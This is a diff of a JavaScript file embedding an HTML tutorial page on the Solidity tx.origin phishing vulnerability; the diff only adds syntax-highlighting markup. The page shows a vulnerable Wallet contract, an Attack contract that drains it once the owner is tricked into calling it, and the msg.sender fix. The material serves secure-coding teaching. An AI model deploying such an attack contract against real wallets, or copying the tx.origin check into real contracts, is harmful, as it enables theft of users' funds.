@@ -8,63 +8,63 @@ const html = `<h3 id="whats-the-difference-between-msgsender-and-txorigin">What&
 <h3 id="vulnerability">Vulnerability</h3>
 <p>A malicious contract can deceive the owner of a contract into calling a
 function that only the owner should be able to call.</p>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.6.10;
+<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.6.10;</span>
 
-/*
+<span class="hljs-comment">/*
 Wallet is a simple contract where only the owner should be able to transfer
 Ether to another address. Wallet.transfer() uses tx.origin to check that the
-caller is the owner. Let&#39;s see how we can hack this contract
-*/
+caller is the owner. Let&#x27;s see how we can hack this contract
+*/</span>
 
-/*
+<span class="hljs-comment">/*
 1. Alice deploys Wallet with 10 Ether
-2. Eve deploys Attack with the address of Alice&#39;s Wallet contract.
+2. Eve deploys Attack with the address of Alice&#x27;s Wallet contract.
 3. Eve tricks Alice to call Attack.attack()
-4. Eve successfully stole Ether from Alice&#39;s wallet
+4. Eve successfully stole Ether from Alice&#x27;s wallet
 
 What happened?
 Alice was tricked into calling Attack.attack(). Inside Attack.attack(), it
-requested a transfer of all funds in Alice&#39;s wallet to Eve&#39;s address.
-Since tx.origin in Wallet.transfer() is equal to Alice&#39;s address,
+requested a transfer of all funds in Alice&#x27;s wallet to Eve&#x27;s address.
+Since tx.origin in Wallet.transfer() is equal to Alice&#x27;s address,
 it authorized the transfer. The wallet transferred all Ether to Eve.
-*/
+*/</span>
 
-contract Wallet {
-    address public owner;
+<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Wallet</span> </span>{
+    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> owner;
 
-    constructor() public payable {
-        owner = msg.sender;
+    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
+        owner = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;
     }
 
-    function transfer(address payable _to, uint _amount) public {
-        require(tx.origin == owner, "Not owner");
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title"><span class="hljs-built_in">transfer</span></span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">payable</span> _to, <span class="hljs-keyword">uint</span> _amount</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
+        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">tx</span>.<span class="hljs-built_in">origin</span> == owner, <span class="hljs-string">"Not owner"</span>);
 
-        (bool sent, ) = _to.call{value: _amount}("");
-        require(sent, "Failed to send Ether");
+        (<span class="hljs-keyword">bool</span> sent, ) = _to.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value:</span> _amount}(<span class="hljs-string">""</span>);
+        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);
     }
 }
 
-contract Attack {
-    address payable public owner;
+<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{
+    <span class="hljs-keyword">address</span> <span class="hljs-keyword">payable</span> <span class="hljs-keyword">public</span> owner;
     Wallet wallet;
 
-    constructor(Wallet _wallet) public {
+    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params">Wallet _wallet</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
         wallet = Wallet(_wallet);
-        owner = msg.sender;
+        owner = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;
     }
 
-    function attack() public {
-        wallet.transfer(owner, address(wallet).balance);
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
+        wallet.<span class="hljs-built_in">transfer</span>(owner, <span class="hljs-keyword">address</span>(wallet).<span class="hljs-built_in">balance</span>);
     }
 }</code></pre>
 <h3 id="preventative-techniques">Preventative Techniques</h3>
 <p>Use <code>msg.sender</code> instead of <code>tx.origin</code></p>
-<pre><code class="language-solidity">    function transfer(address payable _to, uint _amount) public {
-        require(msg.sender == owner, "Not owner");
+<pre><code class="language-solidity">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title"><span class="hljs-built_in">transfer</span></span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">payable</span> _to, <span class="hljs-keyword">uint</span> _amount</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
+        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span> == owner, <span class="hljs-string">"Not owner"</span>);
 
-        (bool sent, ) = _to.call.value(_amount)("");
-        require(sent, "Failed to send Ether");
+        (<span class="hljs-keyword">bool</span> sent, ) = _to.<span class="hljs-built_in">call</span>.<span class="hljs-built_in">value</span>(_amount)(<span class="hljs-string">""</span>);
+        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);
     }</code></pre>
 `
 
